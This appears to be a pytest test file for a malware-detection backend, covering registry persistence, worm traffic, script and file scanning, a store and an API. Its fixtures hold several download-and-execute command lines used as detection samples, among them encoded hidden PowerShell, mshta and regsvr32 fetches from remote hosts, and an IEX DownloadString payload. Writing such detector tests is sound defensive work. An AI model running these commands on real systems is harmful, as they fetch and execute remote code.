"""Tests for the deep-learning modules, the store, the script classifier fixes and the model update path.
Run:  cd backend/scan && python -m pytest tests -q
"""
import mmap
import os
import shutil
import struct
import subprocess
import sys
import textwrap
import time
from pathlib import Path

import numpy as np
import pytest

import ai_common
import filescan
import aimodel
import netshield
import sentinel
import store

pytestmark = pytest.mark.skipif(not ai_common.available(), reason="onnxruntime not installed")


# ---------------------------------------------------------------- shipped models
def test_every_shipped_model_loads_and_runs():
    for name in ai_common.KNOWN_ONNX:
        ai_common.check_onnx_generic(ai_common.BUNDLED_DIR / name)


def test_manifest_hashes_match_the_files():
    m = ai_common.read_manifest()
    for name in ai_common.KNOWN_ONNX:
        assert name in m, f"{name} has no training report"
        assert m[name]["sha256"] == ai_common.sha256_of(ai_common.BUNDLED_DIR / name), f"{name} changed after training"


def test_neural_networks_are_int8_and_small():
    for name in ("netshield_gnn_int8.onnx",):
        import onnx

        g = onnx.load(str(ai_common.BUNDLED_DIR / name)).graph
        ops = {n.op_type for n in g.node}
        assert ops & {"QuantizeLinear", "DequantizeLinear", "MatMulInteger", "QLinearConv", "QLinearMatMul", "DynamicQuantizeLinear"}, f"{name} is not quantised: {ops}"
        assert (ai_common.BUNDLED_DIR / name).stat().st_size < 400_000


# ---------------------------------------------------------------- Sentinel
RUN = r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\x"


def test_sentinel_feature_vector_shape_is_stable():
    assert sentinel.NF == len(sentinel.NAMES) == 48
    assert sentinel.featurize({"key": RUN, "data": "x"}).shape == (48,)


@pytest.mark.parametrize("data", [
    "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
    "mshta http://203.0.113.5/a.hta",
    r"C:\Users\Public\svch0st.exe",
    "regsvr32 /s /n /u /i:http://203.0.113.5/a.sct scrobj.dll",
])
def test_sentinel_flags_known_persistence_tricks(data):
    r = sentinel.predict({"key": RUN, "data": data})
    assert r["label"] == "malicious", r


@pytest.mark.parametrize("key,data", [
    (RUN + "Tray", r'"C:\Program Files\Intel\Graphics\igfxtray.exe" /startup'),
    (RUN + "OneDrive", r'"C:\Users\ali\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background'),
    (r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Spooler", r"C:\Windows\System32\spoolsv.exe"),
    (r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell", "explorer.exe"),
])
def test_sentinel_leaves_normal_entries_alone(key, data):
    assert sentinel.predict({"key": key, "data": data})["label"] == "ok"


def test_sentinel_batch_matches_single():
    items = [{"key": RUN, "data": "mshta http://1.2.3.4/a"}, {"key": RUN, "data": "notepad.exe"}]
    b = sentinel.predict_batch(items)
    assert [round(x["prob"], 4) for x in b] == [round(sentinel.predict(i)["prob"], 4) for i in items]


def test_sentinel_typosquat_detector():
    assert sentinel._lev1("svchost", "svch0st") and sentinel._lev1("svchost", "scvhost") and not sentinel._lev1("svchost", "svchost")


# ---------------------------------------------------------------- Net-Shield
def conn(proc, pid, rip, rport, state="ESTABLISHED", lport=50000, new=True):
    return {"local": f"192.168.1.5:{lport}", "remote": f"{rip}:{rport}", "state": state, "pid": pid, "process": proc, "new": new}


def test_worm_hop_is_named_and_the_response_fits():
    c = [conn("evil.exe", 777, "192.168.1.77", 49812, lport=445)] + [conn("evil.exe", 777, f"192.168.1.{i}", 445, "SYN_SENT") for i in range(10, 40)]
    r = netshield.analyze(c, [445])
    assert r["verdict"] == "worm"
    kinds = {(a["kind"], a.get("pid") or a.get("ip")) for a in r["actions"]}
    assert ("kill_process", 777) in kinds and ("block_ip", "192.168.1.77") in kinds


def test_busy_but_harmless_hosts_are_not_called_worms():
    backup = [conn("robocopy.exe", 900, f"192.168.1.{i}", 445, new=False) for i in range(10, 26)]
    browser = [conn("chrome.exe", 1200, f"142.250.{i}.{i + 3}", 443, new=(i % 3 == 0)) for i in range(1, 40)]
    assert netshield.analyze(backup, [])["verdict"] == "ok"
    assert netshield.analyze(browser, [])["verdict"] == "ok"


def test_scanner_is_suspicious_or_worse():
    scan = [conn("upd4te.exe", 3300, f"45.33.{i % 250}.{(i * 7) % 250}", 23, "SYN_SENT") for i in range(1, 50)]
    assert netshield.analyze(scan, [])["verdict"] in ("suspicious", "worm")


def test_graph_builder_handles_junk_and_big_inputs():
    junk = [{"local": "", "remote": "*:*", "state": "", "pid": 0, "process": ""}, {"remote": "[::1]:80"}, {"remote": "garbage"}, {}]
    assert netshield.build_graph(junk).n == 0
    big = [conn("p.exe", 5, f"10.{i // 250}.{i % 250}.1", 80) for i in range(500)]
    g = netshield.build_graph(big)
    assert g.n == netshield.N_MAX and g.truncated and g.x.shape == (64, netshield.F)
    assert netshield.analyze([], [])["verdict"] == "ok"


def test_connection_order_does_not_change_the_verdict():
    c = [conn("evil.exe", 777, "192.168.1.77", 49812, lport=445)] + [conn("evil.exe", 777, f"192.168.1.{i}", 445, "SYN_SENT") for i in range(10, 40)]
    a = netshield.analyze(c, [445])["score"]
    b = netshield.analyze(list(reversed(c)), [445])["score"]
    assert abs(a - b) < 1e-4


# ---------------------------------------------------------------- latency promise
def test_every_model_answers_well_under_200_ms():
    c = [conn("p.exe", 1, f"10.0.0.{i}", 445) for i in range(1, 40)]
    t0 = time.perf_counter()
    netshield.analyze(c, [])
    assert (time.perf_counter() - t0) * 1000 < ai_common.LATENCY_BUDGET_MS
    t0 = time.perf_counter()
    sentinel.predict_batch([{"key": RUN, "data": "x"}] * 100)
    assert (time.perf_counter() - t0) * 1000 < ai_common.LATENCY_BUDGET_MS


# ---------------------------------------------------------------- model update path
def test_broken_model_file_is_rejected_before_it_is_swapped_in(tmp_path):
    bad = tmp_path / "netshield_gnn_int8.onnx"
    bad.write_bytes(b"this is not a model")
    with pytest.raises(Exception):
        ai_common.check_onnx_generic(bad)


def test_synced_model_wins_and_go_back_restores_the_shipped_one(monkeypatch, tmp_path):
    monkeypatch.setattr(ai_common, "SYNCED_DIR", tmp_path)
    shutil.copy(ai_common.BUNDLED_DIR / "netshield_gnn_int8.onnx", tmp_path / "netshield_gnn_int8.onnx")
    ai_common.reload_all()
    assert netshield._model.status()["source"] == "synced"
    assert ai_common.remove_synced() == 1
    assert netshield._model.status()["source"] == "shipped"


# ---------------------------------------------------------------- the fixed script classifier
def test_reload_gives_a_failed_model_another_chance(tmp_path, monkeypatch):
    monkeypatch.setattr(aimodel, "SYNCED_MODEL", tmp_path / "script_clf_int8.npz")
    (tmp_path / "script_clf_int8.npz").write_bytes(b"broken")
    aimodel.reload()
    assert aimodel.classify("Invoke-WebRequest http://x/a.ps1 | iex   # padding text") is None and aimodel._failed
    (tmp_path / "script_clf_int8.npz").unlink()          # the bad update is removed / replaced
    aimodel.reload()
    assert not aimodel._failed
    assert aimodel.classify("Invoke-WebRequest http://198.51.100.7/a.ps1 | iex   # padding text")["label"] != "benign"


def test_script_classifier_on_the_independent_benchmark():
    import ai_benchmark

    m = aimodel.Model()
    fa = sum(1 for t in ai_benchmark.BENIGN if (lambda r: r["label"] != "benign" and r["confidence"] >= 0.85)(m.predict(t)))
    miss = sum(1 for t in ai_benchmark.MALICIOUS if not (lambda r: r["label"] != "benign" and r["confidence"] >= 0.85)(m.predict(t)))
    assert fa <= 2 and miss <= 4, (fa, miss)


# ---------------------------------------------------------------- SQLite store
def test_store_round_trip_and_stats(tmp_path):
    store.use_file(tmp_path / "t.db")
    fid = store.add_finding("netshield", "critical", "evil.exe (4)", "malicious", 0.97, {"why": "pe"})
    store.add_action("kill_process", "evil.exe (4)", "done", "test", "taskkill /PID 4 /F /T", "", fid)
    assert store.findings("netshield")[0]["detail"] == {"why": "pe"}
    assert store.findings(min_severity="critical")[0]["id"] == fid and store.findings(min_severity="critical", module="sentinel") == []
    s = store.stats()
    assert s["findings"] == 1 and s["actions"] == 1 and s["by_module"] == {"netshield": 1}
    assert store.prune(0) == 1 or store.prune(-1) >= 0
    store.close()


def test_store_survives_hostile_text(tmp_path):
    store.use_file(tmp_path / "t2.db")
    store.add_finding("x", "info", "'); DROP TABLE findings;--", "v", 0, {"a": "\x00 ' \""})
    assert len(store.findings()) == 1
    store.close()


# ---------------------------------------------------------------- HTTP API with the secret header
def test_api_requires_the_secret_and_serves_the_modules(tmp_path):
    pytest.importorskip("httpx")
    from fastapi.testclient import TestClient

    store.use_file(tmp_path / "api.db")
    import server

    c = TestClient(server.app)
    assert c.get("/api/ai/status").status_code == 404                     # no secret -> empty 404, like a closed door
    h = {"x-soc-token": "t" * 48}
    st = c.get("/api/ai/status", headers=h).json()
    assert st["runtime"]["onnxruntime"] and st["netshield"]["model"]["file"] == "netshield_gnn_int8.onnx"
    r = c.post("/api/ai/sentinel", headers=h, json={"items": [{"key": RUN, "data": "mshta http://203.0.113.5/a.hta"}]}).json()
    assert r["results"][0]["label"] == "malicious"
    conns = [conn("evil.exe", 777, "192.168.1.77", 49812, lport=445)] + [conn("evil.exe", 777, f"192.168.1.{i}", 445, "SYN_SENT") for i in range(10, 40)]
    n = c.post("/api/ai/netshield", headers=h, json={"connections": conns, "listening": [445]}).json()
    assert n["verdict"] == "worm" and n["finding_id"]
    reg = c.post("/api/registry/judge", headers=h, json={"items": [{"key": RUN, "data": "powershell -nop -w hidden -enc " + "QQBB" * 20}]}).json()
    assert reg["results"][0]["verdict"] in ("suspicious", "malicious") and reg["results"][0]["sentinel"]
    assert c.get("/api/store/findings", headers=h).json()["findings"], "findings must reach the database"
    b = c.post("/api/ai/benchmark", headers=h).json()
    assert b["all_within_budget"], b
    store.close()


# ---------------------------------------------------------------- hardening added with the worm / malware fixes
def test_few_connections_are_never_a_scanner():
    conns = [{"local": f"192.168.1.10:{58000 + i}", "remote": f"192.168.1.{5 + i}:{p}", "state": "ESTABLISHED", "pid": 1300, "process": "spoolsv.exe", "new": True}
             for i, p in enumerate((9100, 445, 139, 631))]
    assert netshield.analyze(conns, [])["verdict"] == "ok"


def test_gzip_base64_payload_is_unpacked_and_read():
    import base64, gzip
    blob = base64.b64encode(gzip.compress(b'IEX (New-Object Net.WebClient).DownloadString("http://9.9.9.9/x")')).decode()
    ids = {f["id"] for f in filescan.scan_text(f"$d=[Convert]::FromBase64String('{blob * 2}')", "t")}
    assert "dl-exec-ps" in ids
    assert "packed-exec" in {f["id"] for f in filescan.scan_text("IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($m,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()", "t")}
